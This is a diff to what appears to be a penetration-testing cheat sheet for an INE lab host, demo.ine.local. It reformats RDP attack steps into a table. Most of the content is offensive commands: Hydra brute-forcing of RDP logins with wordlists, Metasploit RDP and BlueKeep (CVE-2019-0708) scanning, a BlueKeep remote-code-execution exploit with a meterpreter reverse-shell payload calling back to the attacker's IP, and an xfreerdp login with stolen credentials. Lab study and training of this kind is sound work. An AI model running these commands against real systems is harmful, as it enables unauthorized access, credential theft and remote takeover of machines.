@@ -168,21 +168,15 @@ set SMBPass <password>
 exploit
 ```
 
-# --- RDP Brute Force with Hydra ---
-hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
-      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
-      rdp://demo.ine.local -s 3333
+## 🖥️ RDP Brute Force and Enumeration
 
-# --- Start Metasploit and search for RDP modules ---
-msfconsole -q
-
-# Inside msfconsole:
-search rdp
-
-# --- Use RDP Scanner (check if RDP is enabled on target) ---
-use auxiliary/scanner/rdp/rdp_scanner
-set RHOSTS demo.ine.local
-run
+| Task / Step                                 | Command / Syntax                                                                 |
+|---------------------------------------------|----------------------------------------------------------------------------------|
+| **Brute-force RDP login with Hydra**        | ```bash<br>hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \<br>     -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \<br>     rdp://demo.ine.local -s 3333<br>``` |
+| **Use RDP Scanner (check RDP enabled)**     | ```bash<br>use auxiliary/scanner/rdp/rdp_scanner<br>set RHOSTS demo.ine.local<br>run<br>``` |
+| **Scan for BlueKeep (CVE-2019-0708)**       | ```bash<br>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep<br>set RHOSTS demo.ine.local<br>run<br>``` |
+| **Exploit BlueKeep (RCE)** *(optional)*     | ```bash<br>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce<br>set RHOSTS demo.ine.local<br>set RPORT 3389<br>set TARGET 1<br>set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>set LHOST <your-ip><br>set LPORT 4444<br>exploit<br>``` |
+| **Connect using xfreerdp** *(if creds found)* | ```bash<br>xfreerdp /u:<user> /p:<password> /v:demo.ine.local:3333<br>``` |
 
 # --- Optional: Scan for BlueKeep (CVE-2019-0708) vulnerability ---
 use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
